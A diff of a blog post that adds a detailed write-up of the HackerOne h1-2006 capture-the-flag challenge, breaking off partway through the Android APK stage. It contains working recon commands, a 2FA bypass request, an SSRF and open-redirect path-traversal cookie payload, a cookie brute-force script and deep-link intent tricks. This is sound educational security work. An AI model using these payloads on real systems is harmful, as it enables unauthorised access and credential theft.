@@ -4,11 +4,1306 @@ title: h1-2006 CTF
 date: 10/06/2020
 description: My h1-2006 CTF solution
 ---
-<div id="out"></div>
-<script>
-	var key = window.location.search ? window.location.search.substr(1) : 'caca';
-	var req = new XMLHttpRequest();
-	req.open('GET', 'https://de8512deb02f.ngrok.io/h1-2006/' + key, false); 
-	req.send();
-	document.getElementById('out').innerHTML = req.responseText;
-</script>
+
+<h2>[TL;DR]</h2>
+
+<h3><a href="#recon">Reconnaissance</a></h3>
+<p>I did some recon to get a better understanding from the target scope.</p>
+
+<h3><a href="#leaked-creds">Leaked credentials</a></h3>
+<p>A public GitHub repository mentioned a log file name which was accessible via web and was leaking some user credentials.</p>
+
+<h3><a href="#2fa">2FA bypass</a></h3>
+<p>To login as the obtained user, a 2FA system had to be bypassed.</p>
+
+<h3><a href="#ssrf">SSRF + Open redirect</a></h3>
+<p>The accessed application had a SSRF vulnerability which could be chained with an open redirect to find the location of a hidden APK.</p>
+
+<h3><a href="#apk">APK</a></h3>
+<p>A couple of Android challenges needed to be completed in order to obtain a token which could be used on a restricted service.</p>
+
+<h3><a href="#staff">Accessing Staff</a></h3>
+<p>By using this new service and by doing some OSINT on Twitter it was possible to login in the Staff dashboard as an unprivileged user.</p>
+
+<h3><a href="#privesc">Privilege escalation</a></h3>
+<p>By exploiting a pretty complex CSRF I could force an admin to upgrade my user, then I had access to Marten credentials.</p>
+
+<h3><a href="#css-exfil">CSS exfiltration</a></h3>
+<p>With the obtained credentials, it was possible to access the final step that required another 2FA code which could be retrieved by using CSS exfiltration.</p>
+
+<hr><hr>
+
+<h2 id="recon">Reconnaissance</h2>
+
+<p>Everything started with HackerOne's tweet announcing the CTF.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/tweet.png">
+
+<p>As in every program, the first thing to do is read the policy and scope. Instead of a single domain like in the last ctf, here we had a wildcard, so I assumed I would have to deal with some recon and multiple subdomains.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/scope.png">
+
+<p>I started looking for subdomains of <code>bountypay.h1ctf.com</code> using <a href="https://crt.sh" target="_blank">crt.sh</a>.</p> 
+
+<pre class="prettyprint">
+# curl -s "https://crt.sh/?q=bountypay.h1ctf.com&output=json" | jq -r '.[].name_value' | sort -u
+api.bountypay.h1ctf.com
+app.bountypay.h1ctf.com
+bountypay.h1ctf.com
+software.bountypay.h1ctf.com
+staff.bountypay.h1ctf.com
+www.bountypay.h1ctf.com
+</pre>
+
+<p>I tried to get more subdomains with other tools like <code>amass</code> or by brute forcing but didn't get any new results, so I started with those and if I got stuck I would try again to try to discover more assets.</p>
+
+<p>Once I had my list of subdomains, I used <code>massdns</code> to see how they answered to DNS queries.</p>
+
+<pre class="prettyprint">
+# cat crtsh.subs | massdns -r ~/wordlists/resolvers.txt -t A -q -o S
+api.bountypay.h1ctf.com. A 3.21.98.146
+app.bountypay.h1ctf.com. A 3.21.98.146
+bountypay.h1ctf.com. A 3.21.98.146
+software.bountypay.h1ctf.com. A 3.21.98.146
+staff.bountypay.h1ctf.com. A 3.21.98.146
+www.bountypay.h1ctf.com. A 3.21.98.146
+</pre>
+
+<p>It seemed that every subdomain was being hosted from the same IP, an Amazon EC2 instance.</p>
+
+<pre class="prettyprint">
+# curl ipinfo.io/3.21.98.146
+{
+  "ip": "3.21.98.146",
+  "hostname": "ec2-3-21-98-146.us-east-2.compute.amazonaws.com",
+  "city": "Columbus",
+  "region": "Ohio",
+  "country": "US",
+  "loc": "40.1357,-83.0076",
+  "org": "AS16509 Amazon.com, Inc.",
+  "postal": "43236",
+  "timezone": "America/New_York",
+  "readme": "https://ipinfo.io/missingauth"
+}
+</pre>
+
+<p>I used <code>masscan</code> to see what ports were open, so I could identify services running on that host.</p>
+
+<pre class="prettyprint">
+# masscan 3.21.98.146 --rate=1000 -p0-65535
+
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2020-05-29 19:51:04 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 80/tcp on 3.21.98.146
+Discovered open port 22/tcp on 3.21.98.146
+Discovered open port 443/tcp on 3.21.98.146
+</pre>
+
+<p>Ports <code>80</code> and <code>443</code> are certainly web services and port <code>22</code> should be an <code>ssh</code>, so I tried to connect to it using <code>root:root</code> (it never hurts to try).</p>
+
+<pre class="prettyprint">
+# ssh root@3.21.98.146
+root@3.21.98.146: Permission denied (publickey).
+</pre>
+
+<p>As expected it didn't work since my public key was denied, so let's jump into the web.</p>
+
+<h2 id="leaked-creds">Leaked credentials</h2>
+
+<p>By visiting <code>https://bountypay.h1ctf.com</code> I got the following page which simply had links to login as a customer (<code>https://app.bountypay.h1ctf.com/</code>) and as staff (<code>https://staff.bountypay.h1ctf.com/</code>).</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/bountypay.png">
+
+<p>I started with the custom panel and I got a simple login.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/appbountypay.png">
+
+<p>First thing I did was running <code>ffuf</code> to discover other available paths.</p>
+
+<pre class="prettyprint">
+# ffuf -c -t 50 -w ~/wordlists/common.txt -u https://app.bountypay.h1ctf.com/FUZZ -mc all -fs 15
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://app.bountypay.h1ctf.com/FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 15
+________________________________________________
+
+.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
+admin.php               [Status: 404, Size: 178, Words: 7, Lines: 8]
+css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
+</pre>
+
+<p>Turns out that the <code>/.git</code> directory, where the git info is stored, was public, so I went to <code>/.git/config</code> to retrieve the repository configuration.</p> 
+
+<pre class="prettyprint">
+# curl https://app.bountypay.h1ctf.com/.git/config
+[core]
+  repositoryformatversion = 0
+  filemode = true
+  bare = false
+  logallrefupdates = true
+[remote "origin"]
+  url = https://github.com/bounty-pay-code/request-logger.git
+  fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+  remote = origin
+  merge = refs/heads/master
+</pre>
+
+<p>Between that information, there was a GitHub URL (<a href="https://github.com/bounty-pay-code/request-logger.git" target="_blank"><code>https://github.com/bounty-pay-code/request-logger.git</code></a>) from a repository which was also public.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/github.png">
+
+<p>In that repository only the following file (<code>logger.php</code>) had been uploaded.</p>
+
+<pre class="prettyprint linenums">
+&lt;?php
+
+$data = array(
+  'IP'        =>  $_SERVER["REMOTE_ADDR"],
+  'URI'       =>  $_SERVER["REQUEST_URI"],
+  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
+  'PARAMS'    =>  array(
+      'GET'   =>  $_GET,
+      'POST'  =>  $_POST
+  )
+);
+
+file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
+</pre>
+
+<p>This function seemed to be logging every request received in <code>bp_web_trace.log</code>, so I tried to access to that file on the current application.</p>
+
+<pre class="prettyprint">
+# curl https://app.bountypay.h1ctf.com/bp_web_trace.log
+1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
+1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
+1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
+1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
+</pre>
+
+<p>By decoding those values in base64 I got the following JSON structures which were leaking a user <code>brian.oliver</code> and his password <code>V7h0inzX</code>.</p>
+
+<pre class="prettyprint">
+{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
+{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
+{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
+{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
+</pre>
+
+<p>Tried the obtained credentials on the login panel and jackpot.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/2fa.png">
+
+<h2 id="2fa">2FA bypass</h2>
+
+<p>Next step was bypassing the 2 factor authentication since I didn't have access to Brian's mobile phone.</p>
+
+<p>The first thing that came to my mind was brute forcing, but after doing some calculations I thought there had to be simpler solution.</p>
+
+<p><code>26 + 26 + 10 = 62 <br>62^9 = 1.3537087e+16 combinations</code></p>
+
+<p>The request being sent looked like this, being <code>kk</code> the code I was providing.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+username=brian.oliver&password=V7h0inzX&challenge=902c8b655960b85860c99b2ae72f5d3e&challenge_answer=kk
+</pre>
+
+<p>In addition to my <code>challenge_answer</code> there was a static parameter <code>challenge</code> that, by its name, seemed to be the "solution" to my code.</p>
+
+<p>That challenge string (<code>902c8b655960b85860c99b2ae72f5d3e</code>) looked like a MD5 hash and as a challenge_answer it would probably expected the original value of it. I went to a couple of MD5 decrypt websites, but unfortunately it wasn't in any database.</p>
+
+<p>Then, I realized that I was able to modify that challenge hash, so I could simply replace it by a hash which I knew the original value of.</p>
+
+<pre class="prettyprint">
+# echo -n hola | md5sum
+4d186321c1a7f0f354b297e8914ab240  - 
+</pre>
+
+<p>And as expected, there wasn't any backend checks to verify the introduced challenge was the one originally provided. Therefore, with a request like the following one it was possible to bypass the 2FA.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+username=brian.oliver&password=V7h0inzX&challenge=4d186321c1a7f0f354b297e8914ab240&challenge_answer=hola
+</pre>
+
+<h2 id="ssrf">SSRF + Open redirect</h2>
+
+<p>Once I bypassed the 2FA I faced the following dashboard.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/dashboard.png">
+
+<p>Here, there was only one action available which retrieved user transactions for the selected month/year with a GET request to <code>/statements?month=01&year=2020</code>.</p>
+
+<p>I tried brute forcing all available options using <code>ffuf</code> but didn't get any results for any combination of month/year.</p>
+
+<pre class="prettyprint">
+# ffuf -c -w months.txt:MONTH -w years.txt:YEAR -u "https://app.bountypay.h1ctf.com/statements?month=MONTH&year=YEAR" -H "Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9" -mc all -fs 177
+</pre>
+
+<p>Taking a look at the query response, I saw something interesting in the body.</p>
+
+<pre class="prettyprint">
+{
+  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020",
+  "data": "{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
+}
+</pre>
+
+<p>It looked like the app was internally making a request to the <code>url</code> value and returning the response on <code>data</code>. Therefore, if I was able to modify that url I would potentially have a Server-Side Request Forgery (SSRF) vulnerability, being able to communicate with assets I shouldn't be allowed to.</p>
+
+<p>Taking a look at the session cookie (<code>token</code>) which I first thought was a complex JWT, was just a simple JSON object base64 encoded.</p>  
+
+<p style="text-align:center">
+  <code>token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9</code>
+  <br><span>&#11015;&#11015;&#11015;</span><br>
+  <code>{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}</code>
+</p>
+
+<p>I tried changing the cookie <code>account_id</code> value from <code>F8gHiqSdpK</code> to an arbitrary value (<code>{"account_id":"<b>hipotermia</b>","hash":"de235bffd23df6995ad4e0930baac1a2"}</code>), observed I still could call the <code>/statements</code> endpoint and I received a different response with my <code>account_id</code> reflected in the <code>url</code> path and an error message in <code>data</code>.</p>
+
+<pre class="prettyprint">
+{
+  "url": "https://api.bountypay.h1ctf.com/api/accounts/<b>hipotermia</b>/statements?month=01&year=2020",
+  "data": "[\"Invalid Account ID\"]"
+}
+</pre>
+
+<p>This meant I could force the application to do a request to any URL in <code>https://api.bountypay.h1ctf.com/api/accounts/*</code>, so I moved to that domain to see what I could find there.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/apibountypay.png">
+
+<p>On this page, there was nothing else but a link to <code>/redirect?url=https://www.google.com/search?q=REST+API</code>, a potential open redirect, the perfect combination with the above SSRF.</p>
+
+<p>Unfortunately, I found there was some kind of whitelist that only allowed redirections to known sites.</p>
+
+<pre class="prettyprint">
+# curl https://api.bountypay.h1ctf.com/redirect?url=https://malicious.com
+URL NOT FOUND IN WHITELIST
+</pre>
+
+<p>I started playing with different urls to see if I could bypass the restriction but it seemed to have a robust whitelist.</p>
+
+<p>Since <code>https://www.google.com/search?q=</code> was whitelisted and I knew Google has some known open redirects I tried with those, but none of them worked.</p>
+
+<p>Meanwhile, I took a look at the remaining subdomains I found during my recon and saw the following response at <code>software.bountypay.h1ctf.com</code>.</p>
+
+<pre class="prettyprint">
+# curl https://software.bountypay.h1ctf.com
+&lt;html>
+&lt;head>&lt;title>401 Unauthorized&lt;/title>&lt;/head>
+&lt;body>
+&lt;center>&lt;h1>401 Unauthorized&lt;/h1>&lt;/center>
+&lt;hr>&lt;center>You do not have permission to access this server from your IP Address&lt;/center>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<p>I wasn't allowed to access this resource from my IP address (even by changing the <code>X-Forwarded-For</code> header), but maybe I could from the SSRF + open redirect.</p> 
+
+<p>First step was successful, the URL was whitelisted in the open redirect.</p>
+
+<pre class="prettyprint">
+# curl -X GET -I https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/
+HTTP/1.1 302 Found
+Server: nginx/1.14.0 (Ubuntu)
+Date: Tue, 29 May 2020 20:03:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Location: https://software.bountypay.h1ctf.com/
+</pre>
+
+<p>Now, going back to the SSRF, I had to change my <code>account_id</code> so the internal URL resulted in a request to the previous open redirect.</p>
+
+<p style="text-align:center">
+  <code>https://api.bountypay.h1ctf.com/api/accounts/<b>[[ACCOUNT_ID]]</b>/statements?month=01&year=2020</code>
+  <br><span>&#11015;&#11015;&#11015;</span><br>
+  <code>ACCOUNT_ID: <b>../../redirect?url=https://software.bountypay.h1ctf.com/#</b></code>
+  <br><span>&#11015;&#11015;&#11015;</span><br>
+  <code>https://api.bountypay.h1ctf.com/api/accounts/<b>../../redirect?url=https://software.bountypay.h1ctf.com/#</b>/statements?month=01&year=2020</code>
+</p>
+
+<p>I sent the request to <code>/statements?month=01&year=2020</code> with the above payload as <code>account_id</code> in the base64 encoded <code>token</code> cookie and voilà, a login page in <code>data</code>.</p>
+
+<pre class="prettyprint">
+{
+  "url": "https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/#/statements?month=01&year=2020",
+  "data": "&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    &lt;title>Software Storage&lt;/title>\n    &lt;link href=\"/css/bootstrap.min.css\" rel=\"stylesheet\">\n&lt;/head>\n&lt;body>\n\n&lt;div class=\"container\">\n    &lt;div class=\"row\">\n        &lt;div class=\"col-sm-6 col-sm-offset-3\">\n            &lt;h1 style=\"text-align: center\">Software Storage&lt;/h1>\n            &lt;form method=\"post\" action=\"/\">\n                &lt;div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    &lt;div class=\"panel-heading\">Login&lt;/div>\n                    &lt;div class=\"panel-body\">\n                        &lt;div style=\"margin-top:7px\">&lt;label>Username:&lt;/label>&lt;/div>\n                        &lt;div>&lt;input name=\"username\" class=\"form-control\">&lt;/div>\n                        &lt;div style=\"margin-top:7px\">&lt;label>Password:&lt;/label>&lt;/div>\n                        &lt;div>&lt;input name=\"password\" type=\"password\" class=\"form-control\">&lt;/div>\n                    &lt;/div>\n                &lt;/div>\n                &lt;input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            &lt;/form>\n        &lt;/div>\n    &lt;/div>\n&lt;/div>\n&lt;script src=\"/js/jquery.min.js\">&lt;/script>\n&lt;script src=\"/js/bootstrap.min.js\">&lt;/script>\n&lt;/body>\n&lt;/html>"
+}
+</pre>
+
+<p>At that point I was able to access <code>software.bountypay.h1ctf.com</code>, so I had to find if there was something interesting there other than a simple login page. Therefore, I created the following python script to generate a cookie for every path in my <code>common.txt</code> wordlist.</p>
+
+<pre class="prettyprint linenums">
+import base64
+
+with open('~/wordlists/common.txt') as f:
+  dirs = f.read().split('\n')
+
+cookies = []
+for dir in dirs:
+  cookie = '{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/'+ dir +'#","hash":"de235bffd23df6995ad4e0930baac1a2"}'
+  b64cookie = base64.b64encode(cookie)
+  cookies.append(b64cookie)
+
+with open('cookies.txt', 'w') as f:
+  f.write('\n'.join(cookies))
+</pre>
+
+<p>Then I could simply brute force using <code>ffuf</code> with the generated wordlist to search for web content.</p>
+
+<pre class="prettyprint">
+# ffuf -c -t 50 -w cookies.txt -H "Cookie: token=FUZZ" -u "https://app.bountypay.h1ctf.com/statements?month=01&year=2020" -mc all -fw 5,6,7
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://app.bountypay.h1ctf.com/statements?month=01&year=2020
+ :: Header           : Cookie: token=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 5,6,7
+________________________________________________
+
+eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzIyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 [Status: 200, Size: 489, Words: 63, Lines: 1]
+eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 1605, Words: 324, Lines: 1]
+</pre>
+
+<p>I only found two results, one for <code>/uploads</code> and another for <code>/</code>.</p>
+
+<pre class="prettyprint">
+# echo eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzIyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d | jq
+{
+  "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com<b>/uploads#</b>",
+  "hash": "de235bffd23df6995ad4e0930baac1a2"
+}
+# echo eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= | base64 -d | jq
+{
+  "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com<b>/#</b>",
+  "hash": "de235bffd23df6995ad4e0930baac1a2"
+}
+</pre>
+
+<p>I checked what there was in <code>/uploads</code> and a directory listing with a single apk file was returned.</p>
+
+<pre class="prettyprint">
+# curl -s "https://app.bountypay.h1ctf.com/statements?month=01&year=2020" -H "Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzIyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9" | jq
+{
+  "url": "https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/uploads#/statements?month=01&year=2020",
+  "data": "&lt;html>\n&lt;head>&lt;title>Index of /uploads/&lt;/title>&lt;/head>\n&lt;body bgcolor=\"white\">\n&lt;h1>Index of /uploads/&lt;/h1>&lt;hr>&lt;pre>&lt;a href=\"../\">../&lt;/a>\n&lt;a href=\"/uploads/BountyPay.apk\">BountyPay.apk&lt;/a>                                        20-Apr-2020 11:26              4043701\n&lt;/pre>&lt;hr>&lt;/body>\n&lt;/html>\n"
+}
+</pre>
+
+<p>Unfortunately, during the first CTF hours this service was not working correctly. It wasn't possible to download that apk and I spent almost all night trying to figure out what was happening, so I finally went to sleep and woke up to this.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/download-fix.png">
+
+<p>Then, I could simply access to the URL and download the apk.</p>
+
+<pre class="prettyprint">
+# wget https://software.bountypay.h1ctf.com/uploads/BountyPay.apk
+</pre>
+
+<h2 id="apk">APK</h2>
+
+<p>First thing I do when I face an Android application is use <code>apktool</code> to decode the application resources and <code>dex2jar</code> to get the <code>.jar</code> file.</p>
+
+<pre class="prettyprint">
+# apktool d BountyPay.apk 
+I: Using Apktool 2.4.1-683fef-SNAPSHOT on BountyPay.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/hipotermia/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+</pre>
+
+<pre class="prettyprint">
+# d2j-dex2jar.sh BountyPay.apk 
+dex2jar BountyPay.apk -> ./BountyPay-dex2jar.jar
+</pre>
+
+<p>Then, by using <code>jd-gui</code> I can inspect application Java code.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/jd-gui.png">
+
+<p>Here, filenames spoke by itself and it seemed there were three different stages to complete this challenge.</p>
+
+<p>Next step was to install the apk on my mobile phone to see how it looked.</p>
+
+<pre class="prettyprint">
+# adb install ~/bb/programs/h1-2006-ctf/BountyPay.apk 
+Performing Push Install
+/home/hipotermia/bb/programs/h1-2006-ctf/BountyPay.apk: 1 file pushed. 60.4 MB/s (4043701 bytes in 0.064s)
+  pkg: /data/local/tmp/BountyPay.apk
+Success
+</pre>
+
+<p>Home screen was a simple form where a username and an optional twitter handler were requested.</p>
+
+<img class="img-fluid" style="width: 325px;" src="/static/img/bb/h1-2006-ctf-solution/apk-home.png">
+
+<p>I used hipotermia / hipotermia and clicked submit to begin with the first stage.</p>
+
+<h3>Part one</h3>
+
+<p>To start, I was presented with a simple white screen.</p>
+
+<img class="img-fluid" style="width: 325px;" src="/static/img/bb/h1-2006-ctf-solution/part-one.png">
+
+<p>Nothing to do there, so I checked the code of <code>bounty.pay.PartOneActivity.class</code> and saw this interesting fragment.</p>
+
+<pre class="prettyprint linenums">
+if (getIntent() != null && getIntent().getData() != null) {
+  String str = getIntent().getData().getQueryParameter("start");
+  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
+    str = sharedPreferences.getString("USERNAME", "");
+    SharedPreferences.Editor editor = sharedPreferences.edit();
+    String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
+    editor.putString("PARTONE", "COMPLETE").apply();
+    logFlagFound(str, str1);
+    startActivity(new Intent((Context)this, PartTwoActivity.class));
+  } 
+} 
+</pre>
+
+<p>I assumed the goal of the challenge was reaching the <code>editor.putString("PARTONE", "COMPLETE").apply();</code> instruction and, to execute that line, the intent needed a query parameter <code>start</code> with a value equal to <code>PartTwoActivity</code>.</p>
+
+<p>To launch the intent with a query parameter manually I had to build a URL which executed this activity, so I checked the <code>AndroidManifest.xml</code> and saw it was defined with a custom host and a scheme.</p> 
+
+<pre class="prettyprint linenums">
+&lt;activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
+    &lt;intent-filter android:label="">
+        &lt;action android:name="android.intent.action.VIEW"/>
+        &lt;category android:name="android.intent.category.DEFAULT"/>
+        &lt;category android:name="android.intent.category.BROWSABLE"/>
+        <b>&lt;data android:host="part" android:scheme="one"/></b>
+    &lt;/intent-filter>
+&lt;/activity>
+</pre>
+
+<p>I could launch the activity with the desired parameter by using a URL like <code>one://part?start=PartTwoActivity</code>, so I created the following HTML code.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+  &lt;body>
+  &lt;a href="one://part?start=PartTwoActivity">hola&lt;/a>
+  &lt;/body>
+&lt;/html>
+</pre>
+
+<p>Then, by clicking the above link, the activity was launched with that query parameter and I was redirected to part two.</p>
+
+<h3>Part two</h3>
+
+<p>Same behavior as the first part, a simple blank page.</p>
+
+<img class="img-fluid" style="width: 325px;" src="/static/img/bb/h1-2006-ctf-solution/part-two.png">
+
+<p>I did the same thing, went to <code>bounty.pay.PartTwoActivity.class</code> and there was a similar piece of code where some query parameters were required (<code>two=light</code> and <code>switch=on</code>) in order to show some hidden elements.</p>
+
+<pre class="prettyprint linenums">
+if (getIntent() != null && getIntent().getData() != null) {
+  Uri uri = getIntent().getData();
+  String str1 = uri.getQueryParameter("two");
+  String str2 = uri.getQueryParameter("switch");
+  if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
+    editText.setVisibility(0);
+    button.setVisibility(0);
+    textView.setVisibility(0);
+  } 
+} 
+</pre>
+
+<p>Also checked the <code>AndroidManifest.xml</code> file and observed that this activity was being defined with a scheme <code>two</code> instead.</p>
+
+<pre class="prettyprint linenums">
+&lt;activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
+    &lt;intent-filter android:label="">
+        &lt;action android:name="android.intent.action.VIEW"/>
+        &lt;category android:name="android.intent.category.DEFAULT"/>
+        &lt;category android:name="android.intent.category.BROWSABLE"/>
+        <b>&lt;data android:host="part" android:scheme="two"/></b>
+    &lt;/intent-filter>
+&lt;/activity>
+</pre>
+
+<p>I modified my HTML code so I could execute this activity with the desired parameters.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+  &lt;body>
+  &lt;a href="one://part?start=PartTwoActivity">hola&lt;/a>
+  &lt;br>
+  &lt;a href="two://part?two=light&switch=on">hola2&lt;/a>
+  &lt;/body>
+&lt;/html>
+</pre>
+
+<p>And by accessing that link, the content of the activity changed, showing those hidden elements.</p>
+
+<img class="img-fluid" style="width: 325px;" src="/static/img/bb/h1-2006-ctf-solution/part-two2.png">
+
+<p>I reviewed the code to see what was the application expecting in that input and saw it was comparing the introduced text with <code>X-</code> + the value of the element <code>header</code> from a <code>Firebase</code> database.</p>
+
+<pre class="prettyprint linenums">
+DatabaseReference database = FirebaseDatabase.getInstance().getReference();
+DatabaseReference childRef = this.database.child("header");
+[...]
+public void submitInfo(View paramView) {
+  final String post = ((EditText)findViewById(2131230834)).getText().toString();
+  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
+        public void onCancelled(DatabaseError param1DatabaseError) { Log.e("PartTwoActivity", "onCancelled", (Throwable)param1DatabaseError.toException()); }
+        
+        public void onDataChange(DataSnapshot param1DataSnapshot) {
